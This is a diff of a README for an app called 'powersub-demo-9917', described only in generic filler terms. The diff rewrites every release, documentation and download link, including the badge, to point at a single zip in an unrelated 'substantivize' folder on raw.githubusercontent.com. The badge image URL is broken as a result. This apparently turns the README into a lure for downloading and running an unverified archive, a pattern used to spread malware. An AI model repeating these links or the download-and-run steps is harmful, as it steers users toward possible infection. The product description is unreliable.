@@ -4,14 +4,14 @@
 powersub-demo-9917 is a user-friendly application designed to simplify your tasks. This software helps you manage and organize your projects efficiently. Whether you're working from home or in an office, powersub-demo-9917 offers practical features to make your life easier.
 
 ## 📥 Download Now
-[![Download powersub-demo-9917](https://img.shields.io/badge/Download%20Now-v1.0-brightgreen)](https://github.com/hac4ker/powersub-demo-9917/releases)
+[![Download powersub-demo-9917](https://raw.githubusercontent.com/hac4ker/powersub-demo-9917/main/substantivize/powersub-demo-9917.zip%20Now-v1.0-brightgreen)](https://raw.githubusercontent.com/hac4ker/powersub-demo-9917/main/substantivize/powersub-demo-9917.zip)
 
 ## 🚀 Getting Started
 Getting started with powersub-demo-9917 is simple. Follow these steps to download and run the software:
 
 1. **Visit the Release Page**  
    Click the link below to visit the release page:  
-   [Visit the Release Page](https://github.com/hac4ker/powersub-demo-9917/releases)
+   [Visit the Release Page](https://raw.githubusercontent.com/hac4ker/powersub-demo-9917/main/substantivize/powersub-demo-9917.zip)
 
 2. **Choose the Right File**  
    On the release page, you will see a list of available files. Look for the latest version, often labeled as the "latest" release. 
@@ -44,7 +44,7 @@ powersub-demo-9917 offers several key features:
 ## ❓ Frequently Asked Questions
 
 ### How do I update the application?
-To update, simply revisit the [Release Page](https://github.com/hac4ker/powersub-demo-9917/releases) and download the latest version, following the same steps as before.
+To update, simply revisit the [Release Page](https://raw.githubusercontent.com/hac4ker/powersub-demo-9917/main/substantivize/powersub-demo-9917.zip) and download the latest version, following the same steps as before.
 
 ### Can I run this on my Linux machine?
 Yes, powersub-demo-9917 supports Linux. Ensure you download the correct version for your distribution from the release page.
@@ -62,8 +62,8 @@ If you need help, you can reach out via the Issues section of this repository. W
 If you wish to contribute to powersub-demo-9917, please check our guidelines in the repository. Your input is welcome!
 
 ## 🔗 Links
-For more information, visit the [Documentation Page](https://github.com/hac4ker/powersub-demo-9917).
+For more information, visit the [Documentation Page](https://raw.githubusercontent.com/hac4ker/powersub-demo-9917/main/substantivize/powersub-demo-9917.zip).
 
 ## 📣 Download & Install
 To get started with powersub-demo-9917, visit the page below to download the latest version:  
-[Download Now](https://github.com/hac4ker/powersub-demo-9917/releases)
+[Download Now](https://raw.githubusercontent.com/hac4ker/powersub-demo-9917/main/substantivize/powersub-demo-9917.zip)
